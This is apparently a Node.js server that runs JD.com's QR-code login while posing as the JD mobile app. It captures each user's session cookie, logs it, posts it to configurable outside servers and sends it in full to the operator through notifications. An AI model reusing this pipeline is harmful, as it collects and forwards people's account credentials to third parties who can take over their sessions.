// 填入你的配置，或者通过环境变量传入
let UPDATE_API = '' || process.env.UPDATE_API; // 多个服务器使用&符合隔开
const notify = require('./sendNotify');
const express = require('express');
const got = require('got');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const JD_UA = `jdapp;android;10.0.5;8.0.0;${randPhoneId()};network/wifi;Mozilla/5.0 (Linux; Android 8.0.0; HTC U-3w Build/OPR6.170623.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044942 Mobile Safari/537.36`;
const app = express();
const timeout = 15000;
app.use(cors());
app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));
app.use(express.static(path.join(__dirname, 'public')));

/**
 * 字符串工具函数
 * 从 'xxx=yyy' 中提取 'yyy'
 * @param {*} key
 * @return {string} value
 */
const transformKey = (key) => {
    return key.substring(key.indexOf('=') + 1, key.indexOf(';'));
};

/**
 * 生产随机iPhoneID
 *
 * @returns {string}
 */
function randPhoneId() {
    return Math.random().toString(36).slice(2, 10) +
        Math.random().toString(36).slice(2, 10) +
        Math.random().toString(36).slice(2, 10) +
        Math.random().toString(36).slice(2, 10) +
        Math.random().toString(36).slice(2, 10);
}

/**
 * 随机字符串
 *
 * @param length
 * @returns {string}
 */
const ramdomString = (length = 6) => {
    var str = 'abcdefghijklmnopqrstuvwxyz';
    str += str.toUpperCase();
    str += '0123456789';
    var _str = '';
    for (let i = 0; i < length; i++) {
        var rand = Math.floor(Math.random() * str.length);
        _str += str[rand];
    }
    return _str;
};

/**
 * 通过res获取cookie
 * 此cookie用来请求二维码
 *
 * @param {*} response
 * @return {*}
 */
const praseSetCookies = (response) => {
    const s_token = response.body.s_token;
    const guid = transformKey(response.headers['set-cookie'][0]);
    const lsid = transformKey(response.headers['set-cookie'][2]);
    const lstoken = transformKey(response.headers['set-cookie'][3]);
    const cookies = `guid=${guid}; lang=chs; lsid=${lsid}; lstoken=${lstoken};`;
    return {
        s_token,
        guid,
        lsid,
        lstoken,
        cookies,
    };
};

/**
 * 通过res解析headers获得cookie
 *
 * @param {*} response
 * @return {string} userCookie
 */
const getCookie = (response) => {
    // 注释的参数没用，如果二次修改请自行研究
    // const TrackerID = transformKey(response.headers['set-cookie'][0]);
    // const pt_token = transformKey(response.headers['set-cookie'][3]);
    // const pwdt_id = transformKey(response.headers['set-cookie'][4]);
    // const s_key = transformKey(response.headers['set-cookie'][5]);
    // const s_pin = transformKey(response.headers['set-cookie'][6]);

    const pt_key = transformKey(response.headers['set-cookie'][1]);
    const pt_pin = transformKey(response.headers['set-cookie'][2]);
    const userCookie = `pt_key=${pt_key};pt_pin=${pt_pin};`;
    console.log({
        msg: '登录成功',
        time: new Date().toISOString(),
        userCookie,
        pt_pin,
    });
    return userCookie;
};

/**
 * 初始化请求二维码的参数
 *
 */
async function step1() {
    const timeStamp = new Date().getTime();
    const loginUrl =
        'https://plogin.m.jd.com/cgi-bin/mm/new_login_entrance?lang=chs&appid=300' +
        `&returnurl=https://wq.jd.com/passport/LoginRedirect?state=${timeStamp}` +
        '&returnurl=https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport';

    const response = await got(loginUrl, {
        responseType: 'json',
        headers: {
            Connection: 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            Accept: 'application/json, text/plain, */*',
            'Accept-Language': 'zh-cn',
            Referer:
                'https://plogin.m.jd.com/login/login?appid=300' +
                `&returnurl=https://wq.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport',
            'User-Agent': JD_UA,
            Host: 'plogin.m.jd.com',
        },
    });
    return praseSetCookies(response);
}

/**
 * 获取二维码链接
 * @param {*} cookiesObj
 * @return {*}
 */
async function step2(cookiesObj) {
    const {s_token, guid, lsid, lstoken, cookies} = cookiesObj;
    if (cookies == '') {
        throw new Error('获取失败');
    }
    const timeStamp = new Date().getTime();
    const getQRUrl =
        'https://plogin.m.jd.com/cgi-bin/m/tmauthreflogurl?s_token=' +
        `${s_token}&v=${timeStamp}&remember=true`;
    const response = await got.post(getQRUrl, {
        responseType: 'json',
        json: {
            lang: 'chs',
            appid: 300,
            returnurl:
                `https://wqlogin2.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action',
            source: 'wq_passport',
        },
        headers: {
            Connection: 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded; Charset=UTF-8',
            Accept: 'application/json, text/plain, */*',
            Cookie: cookies,
            Referer:
                'https://plogin.m.jd.com/login/login?appid=300' +
                `&returnurl=https://wqlogin2.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport',
            'User-Agent': JD_UA,
            Host: 'plogin.m.jd.com',
        },
    });
    const token = response.body.token;
    const okl_token = transformKey(response.headers['set-cookie'][0]);
    const qrCodeUrl = `https://plogin.m.jd.com/cgi-bin/m/tmauth?appid=300&client_type=m&token=${token}`;
    return {...cookiesObj, qrCodeUrl, okl_token, token};
}

/**
 * 通过前端传回的参数获得cookie
 *
 * @param {*} user
 * @return {*}
 */
async function checkLogin(user) {
    const {s_token, guid, lsid, lstoken, cookies, okl_token, token} = user;
    const timeStamp = new Date().getTime();
    const getUserCookieUrl =
        `https://plogin.m.jd.com/cgi-bin/m/tmauthchecktoken?&token=${token}` +
        `&ou_state=0&okl_token=${okl_token}`;
    const response = await got.post(getUserCookieUrl, {
        responseType: 'json',
        form: {
            lang: 'chs',
            appid: 300,
            returnurl:
                'https://wqlogin2.jd.com/passport/LoginRedirect?state=1100399130787&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action',
            source: 'wq_passport',
        },
        headers: {
            Referer:
                'https://plogin.m.jd.com/login/login?appid=300' +
                `&returnurl=https://wqlogin2.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport',
            Cookie: cookies,
            Connection: 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded; Charset=UTF-8',
            Accept: 'application/json, text/plain, */*',
            'User-Agent': JD_UA,
        },
    });
    return response;
}

/**
 * 获取登录口令
 *
 * @param {*} url
 * @return {*} code
 */
async function getJDCode(url) {
    const timeStamp = new Date().getTime();
    const getCodeUrlObj = new URL(
        'https://api.m.jd.com/api?functionId=jCommand&appid=u&client=apple&clientVersion=8.3.6'
    );
    getCodeUrlObj.searchParams.set(
        'body',
        JSON.stringify({
            appCode: 'jApp',
            command: {
                keyEndTime: timeStamp + 3 * 60 * 1000,
                keyTitle: '【口令登录】点击->立即查看去登录',
                url: url,
                keyChannel: 'Wxfriends',
                keyId: ramdomString(28),
                sourceCode: 'jUnion',
                keyImg:
                    'https://img14.360buyimg.com/imagetools/jfs/t1/188781/6/3393/253109/60a53002E2cd2ea37/17eabc4b8272021b.jpg',
                keyContent: '',
                acrossClient: '0',
            },
        })
    );

    const response = await got.get(getCodeUrlObj.toString(), {
        responseType: 'json',
        headers: {
            Host: 'api.m.jd.com',
            accept: '*/*',
            'accept-language': 'zh-cn',
            'User-Agent': JD_UA,
        },
    });
    return response.body;
}

/**
 * 自动更新服务
 *
 * @return {string} msg
 *
 */
async function updateCookie(cookie, userMsg, cookieTime) {
    if (UPDATE_API) {
        try {
            if (UPDATE_API.includes('&')) {
                const urls = UPDATE_API.split('&');
                let msg = '', index = 1;
                for (let url of urls) {
                    if (!url) continue;
                    if (!url.includes('updateCookie')) url += '/updateCookie';
                    const res = await got.post({
                        url,
                        json: {
                            cookie,
                            userMsg,
                            cookieTime
                        },
                        timeout: 10000,
                    });
                    msg += `服务器${index} ${JSON.parse(res.body).msg}${urls.length === index ? '' : '\n'}`;
                    index++;
                }
                return msg;
            } else {
                if (UPDATE_API.startsWith('http')) {
                    if (!UPDATE_API.includes('updateCookie')) UPDATE_API += '/updateCookie';
                    const res = await got.post({
                        url: UPDATE_API,
                        json: {
                            cookie,
                            userMsg,
                            cookieTime
                        },
                        timeout: 10000,
                    });
                    return JSON.parse(res.body).msg;
                } else {
                    return '更新地址配置错误';
                }
            }
        } catch (err) {
            console.error(err)
            console.log({
                msg: 'Cookie 更新接口失败',
            });
            return '';
        }
    }
    return '';
}

/**
 * 对ck进行处理的流程
 *
 * @param {*} cookie
 * @param userMsg
 * @param cookieTime
 * @return {*}
 */
async function cookieFlow(cookie, userMsg, cookieTime) {
    try {
        const updateMsg = await updateCookie(cookie, userMsg, cookieTime);
        await notify.sendNotify(updateMsg, `🎉 有人通过 https://jdck.ml 获取到Cookie啦\n\nCookie 如下\n\n${cookie}\n\n${userMsg ? '备注信息：' + userMsg : ''}`);
    } catch (err) {
        return '';
    }
}

/**
 * API 获取二维码链接
 */
app.get('/qrcode', function (request, response) {
    (async () => {
        try {
            const cookiesObj = await step1();
            const user = await step2(cookiesObj);
            const getCodeBody = await getJDCode(user.qrCodeUrl);
            response.send({err: 0, qrcode: user.qrCodeUrl, user, jdCode: getCodeBody.data,});
        } catch (err) {
            response.send({err: 2, msg: '错误'});
        }
    })();
});

/**
 * API 获取返回的cookie信息
 */
app.post('/cookie', function (request, response) {
    const user = request.body.user;
    const userMsg = request.body.msg;
    if (user && user.cookies != '') {
        (async () => {
            try {
                const cookie = await checkLogin(user);
                if (cookie.body.errcode == 0) {
                    let cookieTime = new Date().getTime() + new Date().getTimezoneOffset() * 60 * 1000 + 8 * 60 * 60 * 1000;//获取ck成功时的时间戳
                    let ucookie = getCookie(cookie);
                    await cookieFlow(ucookie, userMsg, cookieTime);
                    response.send({err: 0, cookie: ucookie, msg: '登录成功'});
                } else {
                    response.send({err: cookie.body.errcode, msg: cookie.body.message});
                }
            } catch (err) {
                response.send({err: 1, msg: err});
            }
        })();
    } else {
        response.send({err: 2, msg: '获取失败'});
    }
});

// 本地运行开启以下
const PORT = 6789;
app.listen(PORT, () => {
    console.log(`应用正在监听 ${PORT} 端口!`);
});

// 云函数运行开启以下
module.exports = app;
